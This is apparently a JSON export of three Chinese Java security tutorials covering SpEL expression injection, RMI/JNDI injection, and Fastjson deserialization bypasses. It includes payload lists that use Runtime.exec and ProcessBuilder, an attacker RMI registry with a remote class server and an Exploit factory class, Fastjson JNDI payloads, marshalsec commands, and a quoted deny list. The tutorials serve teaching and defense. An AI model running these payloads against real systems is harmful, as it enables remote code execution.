[{"title":"SPEL漏洞解析","url":"/2019/03/20/SPEL漏洞解析/","content":"\n# 什么是SPEL\n\nSpring表达式语言全称为“Spring Expression Language”，缩写为“SpEL”，他能在运行时构建复杂表达式、存取对象属性、对象方法调用等等，并且能与 Spring 功能完美整合。表达式语言给静态 Java 语言增加了动态的功能，表达式语言是单独的模块，他只依赖与核心的模块，不依赖与其他模块，能够单独的使用。\n\n因为 Spring 框架的广泛使用，Spel 表达式的应用也十分的广泛。\n\n就安全领域而言，我们只要使用的是 #this 变量、[] 获取属性和 T 运算符，#this 变量用于引用当前评估对象，T 运算符可以用于指定 java.lang.Class 的实例，对 java.lang 中的对象的 T 引用不需要完整的包名，但引用所有其他对象时是需要的。 \n\n## **SpEL 表达式**\n\n### 基本表达式\n\n字面量表达式、关系，逻辑与算数运算表达式、字符串链接及截取表达式、三目运算、正则表达式以及括号优先级表达式；\n\n### 类相关表达式\n\n类类型表达式、类实例化、instanceof 表达式、变量定义及引用、赋值表达式、自定义函数、对象属性存取及安全导航表达式、对象方法调用、Bean 引用；\n\n### 集合相关表达式\n\n内联 List、内联数组、集合、字典访问、列表、字典；\n\n### 其他表达式\n\n模版表达式\n\n# SpEL 基础\n\n在 pom.xml 导入 maven 或是把”org.springframework.expression-3.0.5.RELEASE.jar”添加到类路径中\n\n```xml\n<properties>\n    <org.springframework.version>5.0.8.RELEASE</org.springframework.version>\n</properties>\n<dependency>\n      <groupId>org.springframework</groupId>\n      <artifactId>spring-expression</artifactId>\n      <version>${org.springframework.version}</version>\n</dependency>\n```\n\n## SpEL 使用方式\n\n1. XML配置\n\n   ```xml\n   <bean id=\"numberGuess\" class=\"org.spring.samples.NumberGuess\">\n       <property name=\"randomNumber\" value=\"#{ T(java.lang.Math).random() * 100.0 }\"/>\n       <!-- other properties -->\n   </bean>\n   ```\n\n2. 基于注解的使用\n\n   ```java\n   public class EmailSender {\n       @Value(\"${spring.mail.username}\")\n       private String mailUsername;\n       @Value(\"#{ systemProperties['user.region'] }\")    \n       private String defaultLocale;\n       //...\n   }\n   ```\n\n3. 代码里直接使用\n\n   SpEL 在求表达式值时一般分为四步，其中第三步可选：首先构造一个解析器，其次解析器解析字符串表达式，在此构造上下文，最后根据上下文得到表达式运算后的值。\n\n   ```java\n   ExpressionParser parser = new SpelExpressionParser();\n   Expression expression = parser.parseExpression(\"('Hello' + 'world').concat(#end)\");\n   EvaluationContext context = new StandardEvaluationContext();\n   context.setVariable(\"end\", \"!\");\n   System.out.println(expression.getValue(context));\n   ```\n\n   最后是**expression.getValue()**执行表达式\n\n   1.  **创建解析器：**SpEL 使用 ExpressionParser 接口表示解析器，提供 SpelExpressionParser 默认实现；\n   2. **解析表达式：**使用 ExpressionParser 的 parseExpression 来解析相应的表达式为 Expression 对象。\n   3. **构造上下文：**准备比如变量定义等等表达式需要的上下文数据。\n   4. **求值：**通过 Expression 接口的 getValue 方法根据上下文获得表达式值。\n\n## SpEL 主要接口\n\n1.**ExpressionParser 接口**：表示解析器，默认实现是 org.springframework.expression.spel.standard 包中的 SpelExpressionParser 类，使用 parseExpression 方法将字符串表达式转换为 Expression 对象，对于 ParserContext 接口用于定义字符串表达式是不是模板，及模板开始与结束字符；\n\n```java\npublic interface ExpressionParser {  \n    Expression parseExpression(String expressionString);  \n    Expression parseExpression(String expressionString, ParserContext context);  \n}\n```\n\n实例：\n\n```java\nExpressionParser parser = new SpelExpressionParser();\nParserContext parserContext = new ParserContext() {\n    @Override\n    public boolean isTemplate() {\n    return true;\n    }\n    @Override\n    public String getExpressionPrefix() {\n    return \"#{\";\n    }\n    @Override\n    public String getExpressionSuffix() {\n    return \"}\";\n    }\n};\nString template = \"#{'hello '}#{'world!'}\";\nExpression expression = parser.parseExpression(template, parserContext);\nSystem.out.println(expression.getValue());\n```\n\n**EvaluationContext 接口**：表示上下文环境，默认实现是 org.springframework.expression.spel.support 包中的 StandardEvaluationContext 类，使用 setRootObject 方法来设置根对象，使用 setVariable 方法来注册自定义变量，使用 registerFunction 来注册自定义函数等等。\n\n**Expression 接口**：表示表达式对象，默认实现是 org.springframework.expression.spel.standard 包中的 SpelExpression，提供 getValue 方法用于获取表达式值，提供 setValue 方法用于设置对象值。\n\n## SpEL 类相关表达式\n\n**其中表达式支持非常多的语法，能够造成代码执行的有以下2种：**\n\n1. **类类型表达式**\n   类类型表达式：使用“T(Type)”来表示java.lang.Class实例，“Type”必须是类全限定名，“java.lang”包除外，即该包下的类可以不指定包名；使用类类型表达式还可以进行访问类静态方法及类静态字段。\n\n   ```java\n   ExpressionParser parser = new SpelExpressionParser();\n           \n   // java.lang 包类访问\n   Class<String> result1 = parser.parseExpression(\"T(String)\").getValue(Class.class);\n   System.out.println(result1);\n   \n   //其他包类访问\n   String expression2 = \"T(java.lang.Runtime).getRuntime().exec('open /Applications/Calculator.app')\";\n   Class<Object> result2 = parser.parseExpression(expression2).getValue(Class.class);\n   System.out.println(result2);\n           \n   //类静态字段访问\n   int result3 = parser.parseExpression(\"T(Integer).MAX_VALUE\").getValue(int.class);\n   System.out.println(result3);\n           \n   //类静态方法调用\n   int result4 = parser.parseExpression(\"T(Integer).parseInt('1')\").getValue(int.class);\n   System.out.println(result4);\n   ```\n\n2. **类实例化表达式**\n   类实例化同样使用java关键字“new”，类名必须是全限定名，但java.lang包内的类型除外，如String、Integer。 \n\n   ```java\n   ExpressionParser parser = new SpelExpressionParser();\n   Expression exp = parser.parseExpression(\"new java.util.Date()\");\n   Date value = (Date) exp.getValue();\n   System.out.println(value);\n   ```\n\n# 审计关键点\n\n- org.springframework.expression.spel.standard\n\n- SpelExpressionParser\n- expression.getValue\n- expression.setValue\n\n# 常用payload\n\n```java\n${12*12}\nT(java.lang.Runtime).getRuntime().exec(\"nslookup a.com\")\nT(Thread).sleep(10000)\n#this.getClass().forName('java.lang.Runtime').getRuntime().exec('nslookup a.com')\nnew java.lang.ProcessBuilder({'nslookup a.com'}).start()\n```\n\n# CVE漏洞简析\n\n## SpringBoot SpEL表达式注入漏洞\n\n**影响版本：**1.1.0-1.1.12、1.2.0-1.2.7、1.3.0\n\n其造成的原因主要是在 `ErrorMvcAutoConfiguration.java` 中的 `SpelView` 类:\n\n```java\nprivate static class SpelView implements View {\n        private final String template;\n        private final StandardEvaluationContext context = new StandardEvaluationContext();\n        private PropertyPlaceholderHelper helper;\n        private PlaceholderResolver resolver;\n \n        public SpelView(String template) {\n            this.template = template;\n            this.context.addPropertyAccessor(new MapAccessor());\n            this.helper = new PropertyPlaceholderHelper(\"${\", \"}\");\n            this.resolver = new ErrorMvcAutoConfiguration.SpelPlaceholderResolver(this.context);\n        }\n \n        public String getContentType() {\n            return \"text/html\";\n        }\n \n        public void render(Map<String, ?> model, HttpServletRequest request, HttpServletResponse response) throws Exception {\n            if(response.getContentType() == null) {\n                response.setContentType(this.getContentType());\n            }\n \n            Map<String, Object> map = new HashMap(model);\n            map.put(\"path\", request.getContextPath());\n            this.context.setRootObject(map);\n            String result = this.helper.replacePlaceholders(this.template, this.resolver);\n            response.getWriter().append(result);\n        }\n    }\n```\n\n大致流程为 `PropertyPlaceholderHelper` 类中通过 `parseStringValue` 方法递归字符串找到目标去掉 `$()` ，这个方法中调用 `resolvePlaceholder` 方法来在 `context` 中找到对应的 `name` ，并在这里执行了 `getValue` 操作。由此造成命令执行。代码如下：\n\n```java\npublic String resolvePlaceholder(String name) {\n        Expression expression = this.parser.parseExpression(name);\n \n        try {\n            Object value = expression.getValue(this.context);\n            return HtmlUtils.htmlEscape(value == null?null:value.toString());\n        } catch (Exception var4) {\n            return null;\n        }\n    }\n```\n\n其核心思想就是在递归中从 `context` 下的 `message` 中取出需要再次递归解析的 `$(payload)` ，由此来在下一次的解析后去掉 `$()` 并把其中 `payload` 当作传入的 `name` 参数来执行 `getValue` 操作。\n\n## Spring Data Commons远程代码执行漏洞（CVE-2018-1273）\n\n**影响版本：**1.13-1.13.10、2.0-2.0.5\n\n漏洞形成的原因就是当用户在开发中利用了Spring-data-commons中的特性对用户的输入参数进行自动匹配时候，会将用户提交的form表单中的参数名作为SpEL执行。\n\n**漏洞代码：**\n\n```java\nprivate static class MapPropertyAccessor extends AbstractPropertyAccessor {\n       public void setPropertyValue(String propertyName, @Nullable Object value) throws BeansException {\n           if (!this.isWritableProperty(propertyName)) {\n               throw new NotWritablePropertyException(this.type, propertyName);\n           } else {\n               StandardEvaluationContext context = new StandardEvaluationContext();\n               context.addPropertyAccessor(new MapDataBinder.MapPropertyAccessor.PropertyTraversingMapAccessor(this.type, this.conversionService));\n               context.setTypeConverter(new StandardTypeConverter(this.conversionService));\n               context.setRootObject(this.map);\n               Expression expression = PARSER.parseExpression(propertyName);\n               PropertyPath leafProperty = this.getPropertyPath(propertyName).getLeafProperty();\n               TypeInformation<?> owningType = leafProperty.getOwningType();\n               TypeInformation<?> propertyType = leafProperty.getTypeInformation();\n               propertyType = propertyName.endsWith(\"]\") ? propertyType.getActualType() : propertyType;\n               if (propertyType != null && this.conversionRequired(value, propertyType.getType())) {\n                   PropertyDescriptor descriptor = BeanUtils.getPropertyDescriptor(owningType.getType(), leafProperty.getSegment());\n                   if (descriptor == null) {\n                       throw new IllegalStateException(String.format(\"Couldn't find PropertyDescriptor for %s on %s!\", leafProperty.getSegment(), owningType.getType()));\n                   }\n                   MethodParameter methodParameter = new MethodParameter(descriptor.getReadMethod(), -1);\n                   TypeDescriptor typeDescriptor = TypeDescriptor.nested(methodParameter, 0);\n                   if (typeDescriptor == null) {\n                       throw new IllegalStateException(String.format(\"Couldn't obtain type descriptor for method parameter %s!\", methodParameter));\n                   }\n                   value = this.conversionService.convert(value, TypeDescriptor.forObject(value), typeDescriptor);\n               }\n               expression.setValue(context, value);\n           }\n       }\n```\n\n**开发者使用如下代码：**\n\n```java\n@RequestMapping(method = RequestMethod.POST)\npublic Object register(UserForm userForm, BindingResult binding, Model model) {\n \n        userForm.validate(binding, userManagement);\n        if (binding.hasErrors()) {\n            return \"users\";\n        }\n \n        userManagement.register(new Username(userForm.getUsername()), Password.raw(userForm.getPassword()));\n \n        RedirectView redirectView = new RedirectView(\"redirect:/users\");\n        redirectView.setPropagateQueryParams(true);\n \n        return redirectView;\n   }\n```\n\n其流程简单上说就是在获取POST过来的参数时候因为要自动绑定进入实体类，所以首先要通过 `isWritableProperty` 中调用的 `getPropertyPath` 来判断参数名。如:传来的username参数是否是开发者controller中接收的 `UserForm` 实体类里的一个属性名。然后把用户传入的参数key即 `propertyName` 进行 `PARSER.parseExpression(propertyName)` ，最后 `setValue(context,value)` 触发了恶意代码。\n\n# 防御方式\n\n因为SpEL表达式注入漏洞导致攻击者可以通过表达式执行精心构造的任意代码，导致命令执行。为了防御该类漏洞，Spring官方推出了 `SimpleEvaluationContext` 作为安全类来防御该类漏洞。\n\n\n\n**参考：**\n\nhttps://www.codercto.com/a/55517.html\n\nhttps://www.freebuf.com/vuls/197008.html\n\nhttps://www.jianshu.com/p/ce4ac733a4b9","tags":["JAVA","SPEL"],"categories":["JAVA安全教程"]},{"title":"JAVA RMI和JDNI简介","url":"/2019/03/16/JAVA-RMI和JDNI简介/","content":"# 什么是RMI和JNDI\n\nJava RMI（Java Remote Method Invocation），即Java远程方法调用。是Java编程语言里，一种用于实现远程过程调用的应用程序**编程接口**。RMI 使用 **JRMP（Java Remote Message Protocol，Java远程消息交换协议**）实现，使得客户端运行的程序可以调用远程服务器上的对象。是实现RPC的一种方式。\n\nJava Naming and Directory Interface (JDNI)名为 Java命名和目录接口，，简单来说就是 JNDI 提供了**一组通用的接口**可供应用很方便地去访问不同的后端服务，例如 LDAP、RMI、CORBA 等。\n\nJNDA和RMI的关系可以粗浅的理解为url和http的关系：\n\n- JNDI：类比url，提供访问的地址\n\n- RMI：类比http，是url中使用的协议。\n\n# RMI 的使用\n\n1、server端：创建远程对象，并注册远程对象\n\n```java\n//定义远程对象的接口\npublic interface HelloService extends Remote {\n    String say() throws RemoteException;\n}\n\n//接口的实现\npublic class HelloServiceImpl extends UnicastRemoteObject implements HelloService {\n    public HelloServiceImpl() throws RemoteException{\n        super();\n    }\n\n    @Override\n    public String say() throws RemoteException {\n        return \"Hello\";\n    }\n}\n\n//注册远程对象\npublic class Service {\n    public static void main(String[] args) throws RemoteException, AlreadyBoundException, MalformedURLException {\n        HelloServiceImpl helloService = new HelloServiceImpl();\n        LocateRegistry.createRegistry(1099);\n        Naming.bind(\"rmi://127.0.0.1/hello\",helloService);\n    }\n}\n```\n\n2、client端：查找远程对象，调用远程方法\n\n```java\npublic class Client {\n    public static void main(String[] args) throws RemoteException, NotBoundException, MalformedURLException {\n        HelloService helloService = (HelloService) Naming.lookup(\"rmi://127.0.0.1/hello\");\n        System.out.println(helloService.say());\n    }\n}\n```\n\n# RMI 的原理\n\nRMI本质是TCP网络通信，内部封装了序列化和通信过程，使用代理实现接口调用。\n\n**几个重要知识点：**\n\n1. RMI的传输是基于反序列化的。\n2. 对于任何一个以对象为参数的RMI接口，你都可以发一个自己构建的对象，迫使服务器端将这个对象按任何一个存在于服务端classpath（不在classpath的情况，可以看后面RMI动态加载类相关部分）中的可序列化类来反序列化恢复对象。\n\n### 调用过程\n\n![image-20200216203005799](/images/a9/1.png)\n\n1. Server端监听一个端口，这个端口是JVM随机选择的；\n2. Client端并不知道Server远程对象的通信地址和端口，但是Stub中包含了这些信息，并封装了底层网络操作；\n3. Client端可以调用Stub上的方法；\n4. Stub连接到Server端监听的通信端口并提交参数；\n5. 远程Server端上执行具体的方法，并返回结果给Stub；\n6. Stub返回执行结果给Client端，从Client看来就好像是Stub在本地执行了这个方法一样；\n\n### 获取Stub\n\n假设Stub可以通过调用某个远程服务上的方法向远程服务来获取，但是调用远程方法又必须先有远程对象的Stub，所以这里有个死循环问题。JDK提供了一个RMI注册表（RMIRegistry）来解决这个问题。RMIRegistry也是一个远程对象，默认监听在传说中的**1099端口**上，可以使用代码启动RMIRegistry，也可以使用rmiregistry命令。\n\n![img](/images/a9/2.png)\n\n所以从客户端角度看，服务端应用是有两个端口的，**一个是RMI Registry端口（默认为1099），另一个是远程对象的通信端口（随机分配的）**，通常我们只需要知道Registry的端口就行了，Server的端口包含在了Stub中。RMI Registry可以和Server端在一台服务器上，也可以在另一台服务器上，不过大多数时候在同一台服务器上且运行在同一JVM环境下。\n\n# 动态加载类\n\nRMI核心特点之一就是动态类加载，如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class，动态加载的对象class文件可以使用Web服务的方式进行托管。这可以动态的扩展远程应用的功能，RMI注册表上可以动态的加载绑定多个RMI应用。对于客户端而言，服务端返回值也可能是一些子类的对象实例，而客户端并没有这些子类的class文件，如果需要客户端正确调用这些子类中被重写的方法，则同样需要有运行时动态加载额外类的能力。客户端使用了与RMI注册表相同的机制。RMI服务端将URL传递给客户端，客户端通过HTTP请求下载这些类。\n\n![动态加载类](/images/a9/3.png)\n\n# Weblogic RMI\n\nT3传输协议是WebLogic的自有协议，Weblogic RMI就是通过T3协议传输的（可以理解为序列化的数据载体是T3），它有如下特点：\n\n1. 服务端可以持续追踪监控客户端是否存活（心跳机制），通常心跳的间隔为60秒，服务端在超过240秒未收到心跳即判定与客户端的连接丢失。\n2. 通过建立一次连接可以将全部数据包传输完成，优化了数据包大小和网络消耗。\n\n上面说了JAVA RMI是使用JRMP的协议进行传输，**协议的不同就是他们最大的差别。**\n\n# RMI的攻击一般流程\n\n1. 服务端打开了RMI Registry端口（默认1099）\n2. 创建恶意客户端代码，连接RMI Registry，获取远程恶意对象，并调用恶意对象，执行恶意操作\n\n备注：\n\n- 执行的恶意操作是在服务端执行的，因为RMI就是为了在客户端一样方便的执行远程服务端。并且如果执行的是客户端的恶意操作，那本就不是漏洞\n- 远程恶意对象，是服务器刚好存在，并且我们知道。\n- 通常RMI Registry和服务端在同一服务器且处于同一JVM下，所以可以利用服务器的组件CommonsCollections来构造gadget，构造方法就是前面文章介绍的反序列gadget构造方法。\n\n# RMI小结\n\n1. RMI标准实现是Java RMI，其他实现还有Weblogic RMI、Spring RMI等。\n2. RMI的调用是基于序列化的，**一个对象远程传输需要序列化**，需要使用到这个对象就需要从序列化的数据中恢复这个对象，恢复这个对象时对应的readObject、readExternal等方法会被自动调用。\n3. RMI可以利用服务器本地反序列化利用链进行攻击。\n4. RMI具有动态加载类的能力以及能利用这种能力进行恶意利用。这种利用方式是在本地不存在可用的利用链或者可用的利用链中某些类被过滤了导致无法利用时可以使用，不过利用条件有些苛刻。\n5. 讲了Weblogic RMI和Java RMI的区别，以及Java RMI默认使用的专有传输协议（或者也可以叫做默认协议）是JRMP，Weblogic RMI默认使用的传输协议是T3。\n6. Weblogic RMI正常调用触发反序列化以及模拟T3协议触发反序列化都可以，但是模拟T3协议传输简化了很多过程。\n\n# JNDI的使用\n\nJNDI自身并不区分客户端和服务器端，也不具备远程能力，但是被其协同的一些其他应用一般都具备远程能力，JNDI在客户端和服务器端都能够进行一些工作，客户端上主要是进行各种访问，查询，搜索，而服务器端主要进行的是帮助管理配置。\n\n前面说了JNDI类似于url，rmi类似于http，所以JNDI还可以使用除rmi之外的协议，例如LDAP、CORBA等。\n\n##JNDI与RMI配合使用\n\n```java\nHashtable env = new Hashtable();\nenv.put(Context.INITIAL_CONTEXT_FACTORY,\n        \"com.sun.jndi.rmi.registry.RegistryContextFactory\");\nenv.put(Context.PROVIDER_URL,\n        \"rmi://localhost:9999\");\nContext ctx = new InitialContext(env);\n\n//将名称refObj与一个对象绑定，这里底层也是调用的rmi的registry去绑定\nctx.bind(\"refObj\", new RefObject());\n\n//通过名称查找对象\nctx.lookup(\"refObj\");\n```\n\n## JNDI与LDAP配合使用\n\n```java\nHashtable env = new Hashtable();\nenv.put(Context.INITIAL_CONTEXT_FACTORY,\n \"com.sun.jndi.ldap.LdapCtxFactory\");\nenv.put(Context.PROVIDER_URL, \"ldap://localhost:1389\");\n\nDirContext ctx = new InitialDirContext(env);\n\n//通过名称查找远程对象，假设远程服务器已经将一个远程对象与名称cn=foo,dc=test,dc=org绑定了\nObject local_obj = ctx.lookup(\"cn=foo,dc=test,dc=org\");\n```\n\n# JNDI动态协议转换\n\n上面的两个例子都手动设置了对应服务的工厂以及对应服务的PROVIDER_URL，但是JNDI是能够进行动态协议转换的。\n\n例如：\n\n```java\nContext ctx = new InitialContext();\nctx.lookup(\"rmi://attacker-server/refObj\");\n//ctx.lookup(\"ldap://attacker-server/cn=bar,dc=test,dc=org\");\n//ctx.lookup(\"iiop://attacker-server/bar\");\n```\n\n上面没有设置对应服务的工厂以及PROVIDER_URL，JNDI根据**传递的URL协议**自动转换与设置了对应的工厂与PROVIDER_URL（即使服务端提前设置了工厂与PROVIDER_URL）。\n\n在使用lookup方法时，会进入getURLOrDefaultInitCtx这个方法，转换就在这里面：\n\n```java\npublic Object lookup(String name) throws NamingException {\n    return getURLOrDefaultInitCtx(name).lookup(name);\n}\n\nprotected Context getURLOrDefaultInitCtx(String name) \nthrows NamingException {\nif (NamingManager.hasInitialContextFactoryBuilder()) {//这里不是说我们设置了上下文环境变量就会进入，因为我们没有执行初始化上下文工厂的构建，所以上面那两种情况在这里都不会进入\n    return getDefaultInitCtx();\n}\nString scheme = getURLScheme(name);//尝试从名称解析URL中的协议\nif (scheme != null) {\n    Context ctx = NamingManager.getURLContext(scheme, myProps);//如果解析出了Schema协议，则尝试获取其对应的上下文环境\n    if (ctx != null) {\n   return ctx;\n    }\n}\nreturn getDefaultInitCtx();\n   }\n```\n\n# JNDI漏洞原理\n\nJNDI接口在初始化时，可以将RMI URL作为参数传入，而JNDI注入就出现在客户端的lookup()函数中，如果lookup()的参数可控就可能被攻击。\n\n备注：\n\n- InitialContext 是一个实现了 Context接口的类。使用这个类作为JNDI命名服务的入口点。创建InitialContext 对象需要传入一组属性，参数类型为java.util.Hashtable或其子类之一。\n- 需要重点注意的是，JNDI注入恶意的RMI服务器是攻击者在本地可控，**被攻击的服务器看成是发起lookup请求的客户端。**\n\n上一章节讲了RMI的漏洞利用，恶意代码是在RMI服务端执行的。所以为什么目标服务器lookup(RMI客户端)一个恶意的RMI服务地址，恶意代码会在目标服务器（RMI客户端）执行呢？\n\n## 利用JNDI References进行注入\n\n在JNDI服务中，RMI服务端除了直接绑定远程对象之外，还可以**通过References类来绑定一个外部的远程对象**（当前名称目录系统之外的对象）。绑定了Reference之后，服务端会先通过Referenceable.getReference()获取绑定对象的引用，并且在目录中保存。当客户端在lookup()查找这个远程对象时，客户端会获取相应的object factory，最终通过factory类将reference转换为具体的对象实例。\n\n使用工厂的话，因为为了构造对象，需要先从远程获取工厂类，**并在目标系统中工厂类被加载**。\n\n**整个利用流程如下：**\n\n1. 目标代码中调用了InitialContext.lookup(URI)，且URI为用户可控；\n2. 攻击者控制URI参数为恶意的RMI服务地址，如：rmi://hacker_rmi_server//name；\n3. 攻击者RMI服务器向目标返回一个Reference对象，Reference对象中指定某个精心构造的Factory类；\n4. 目标在进行lookup()操作时，会动态加载并实例化Factory类，接着调用factory.getObjectInstance()获取外部远程对象实例。\n\n## 攻击向量\n\n攻击者的服务端需要启动一个RMI Registry，并且绑定一个Reference远程对象，同时设置一个恶意的factory类。\n\n```java\n    Registry registry = LocateRegistry.createRegistry(1099);\n    String remote_class_server = \"http://192.168.1.200:8080/\";\n    Reference reference = new Reference(\"Exploit\", \"Exploit\", remote_class_server);\n    //reference的factory class参数指向了一个外部Web服务的地址\n    ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);\n    registry.bind(\"xxx\", referenceWrapper);\n```\n\n同时启动一个WebServer提供Exploit.class下载。恶意代码可以放在构造方法中，也可以放在getObjectInstance(）方法中：\n\n```java\npublic class Exploit implements ObjectFactory {\n\n    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) {\n        exec(\"xterm\");\n        return null;\n    }\n\n    public static String exec(String cmd) {\n        try {\n            String sb = \"\";\n            BufferedInputStream in = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());\n            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));\n            String lineStr;\n            while ((lineStr = inBr.readLine()) != null)\n                sb += lineStr + \"\\n\";\n            inBr.close();\n            in.close();\n            return sb;\n        } catch (Exception e) {\n            return \"\";\n        }\n    }\n}\n```\n\n**参考：**\n\nhttps://www.anquanke.com/post/id/194384#h3-2\n\nhttps://www.jianshu.com/p/5c6f2b6d458a\n\nhttps://www.freebuf.com/column/189835.html","tags":["JDNI","RMI","反序列化"],"categories":["JAVA安全教程"]},{"title":"Fastjson历史漏洞绕过分析","url":"/2019/02/18/Fastjson历史漏洞绕过分析/","content":"\n# 前言\n\n本文转载自https://www.anquanke.com/post/id/182140#h2-1, 这里也非常好的总结了fastjson历史的绕过漏洞，基本上就是对checkAutoType函数的绕过。\n\npom文件引用fastjson语法：\n\n```xml\n<!-- https://mvnrepository.com/artifact/com.alibaba/fastjson -->\n<dependency>\n    <groupId>com.alibaba</groupId>\n    <artifactId>fastjson</artifactId>\n    <version>1.2.41</version>\n</dependency>\n```\n\n使用样例：\n\n```java\nimport com.alibaba.fastjson.JSON;\n \npublic class newPoc {\n    public static void main(String[] argv) {\n        String payload = \"{\\\"name\\\":{\\\"@type\\\":\\\"java.lang.Class\\\",\\\"val\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\"},\\\"x\\\":{\\\"@type\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\":\\\"rmi://127.0.0.1/Exploit\\\",\\\"autoCommit\\\":true}}\";\n        JSON.parse(payload);\n    }\n}\n```\n\n\n\n#Fastjson RCE关键函数\n\n**DefaultJSONParser. parseObject()** 解析传入的json字符串提取不同的key进行后续的处理\n\n**TypeUtils. loadClass()**  根据传入的类名，生成类的实例\n\n**JavaBeanDeserializer. Deserialze()** 依次调用@type中传入类的对象公有set\\get\\is方法。\n\n**ParserConfig. checkAutoType()** 阿里后续添加的防护函数，用于在loadclass前检查传入的类是否合法。\n\n # 历史fastjson漏洞汇总与简析\n\n## fastjson RCE漏洞的源头\n\n首先来看一次fastjson反序列化漏洞的poc\n\n```java\n{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\" \"autoCommit\":true}\n```\n\n先看调用栈\n\n```\nExec:620, Runtime  //命令执行\n\n…\n\nLookup:417, InitalContext   /jndi lookup函数通过rmi或者ldap获取恶意类\n\n…\n\nsetAutoCommit:4067, JdbcRowSetImpl 通过setAutoCommit从而在后面触发了lookup函数\n\n…\n\nsetValue:96, FieldDeserializer //反射调用传入类的set函数\n\n…\n\ndeserialze:600,  JavaBeanDeserializer 通过循环调用传入类的共有set,get,is函数\n\n…\n\nparseObject:368, DefaultJSONParser 解析传入的json字符串\n\n…\n```\n\n第一版的利用原理比较清晰，因为fastjson在处理以**@type形式传入的类的时候，会默认调用该类的共有set\\get\\is函数**，因此我们在寻找利用类的时候思路如下：\n\n1. 类的成员变量我们可以控制\n2. 想办法在调用类的某个set\\get\\is函数的时候造成命令执行\n\n于是便找到了JdbcRowSetImpl类，该类在setAutoCommit函数中会对成员变量dataSourceName进行lookup，完美的jndi注入利用。\n\n关于jndi注入的利用方式我在这里简单提一下，因为jndi注入的利用受jdk版本影响较大，所以在利用的时候还是要多尝试的。\n\n注：利用之前当然要先确定一下漏洞是否存在，通过dnslog是个比较好用的法子。\n\n**基于rmi的利用方式：**\n\n**适用jdk版本：**JDK 6u132, JDK 7u122, JDK 8u113之前\n\n利用方式：\n\n```\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalc.jndi.RMIRefServer\n\nhttp://127.0.0.1:8080/test/#Expolit\n```\n\n **基于ldap的利用方式：**\n\n**适用jdk版本：**JDK 11.0.1、8u191、7u201、6u211之前\n\n利用方式：\n\n```\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalc.jndi.LDAPRefServer\n\nhttp://127.0.0.1:8080/test/#Expolit\n```\n\n**基于BeanFactory的利用方式：**\n\n**适用jdk版本：**JDK 11.0.1、8u191、7u201、6u211以后\n\n利用前提：因为这个利用方式需要借助服务器本地的类，而这个类在tomcat的jar包里面，一般情况下只能在tomcat上可以利用成功。\n\n利用方式：\n\n```java\npublic class EvilRMIServerNew {\n    public static void main(String[] args) throws Exception {\n        System.out.println(\"Creating evil RMI registry on port 1097\");\n        Registry registry = LocateRegistry.createRegistry(1097);\n\n        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory\n        ResourceRef ref = new ResourceRef(\"javax.el.ELProcessor\", null, \"\", \"\", true,\"org.apache.naming.factory.BeanFactory\",null);\n\n        //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code\n        ref.add(new StringRefAddr(\"forceString\", \"x=eval\"));\n\n        //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows\n        ref.add(new StringRefAddr(\"x\", \"\\\"\\\".getClass().forName(\\\"javax.script.ScriptEngineManager\\\").newInstance().getEngineByName(\\\"JavaScript\\\").eval(\\\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','open /Applications/Calculator.app/']).start()\\\")\"));\n        \n        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);\n\n        registry.bind(\"Object\", referenceWrapper);\n    }\n}\n```\n\n## fastjson RCE漏洞的历次修复与绕过\n\nfastjson在曝出第一版的RCE漏洞之后，官方立马做了更新，于是就迎来了一个新的主角，checkAutoType()，**在接下来的一系列绕过中都是和这个函数的斗智斗勇**。\n\n先看一下这个函数的代码\n\n```java\npublic Class<?> checkAutoType(String typeName, Class<?> expectClass, int features) {\n    if (typeName == null) {\n        return null;\n    } else if (typeName.length() >= 128) {\n        throw new JSONException(\"autoType is not support. \" + typeName);\n    } else {\n        String className = typeName.replace('$', '.');\n        Class<?> clazz = null;\n        int mask;\n        String accept;\n        if (this.autoTypeSupport || expectClass != null) {\n            for(mask = 0; mask < this.acceptList.length; ++mask) {\n                accept = this.acceptList[mask];\n                if (className.startsWith(accept)) {\n                    clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, false);\n                    if (clazz != null) {\n                        return clazz;\n                    }\n                }\n            }\n\n            for(mask = 0; mask < this.denyList.length; ++mask) {\n                accept = this.denyList[mask];\n                if (className.startsWith(accept) && TypeUtils.getClassFromMapping(typeName) == null) {\n                    throw new JSONException(\"autoType is not support. \" + typeName);\n                }\n            }\n        }\n```\n\n防御的方式比较清晰，限制长度+黑名单，这个时候第一时间产生的想法自然是绕过黑名单，先看一下第一版的黑名单：\n\n```java\nthis.denyList = \"bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.apache.xalan,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework\".split(\",\");\n```\n\n其实第一版的黑名单还是挺强大的，关于黑名单的绕过，就我已知的目前只有一个依赖于ibatis的payload，当然因为ibatis在java里面的使用还是非常广泛的，所以这个payload危害也是比较大的，这也就是1.2.45的绕过。\n\n```json\n{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"rmi://localhost:1099/Exploit\"}}\n```\n\n绕过黑名单是第一种思路，但是安全界大牛们思路还是比较灵活的，很快又发现了第二种思路，我们再仔细看一下checkAutoType函数的下面这几行代码：\n\n```java\nf (!this.autoTypeSupport) {\n    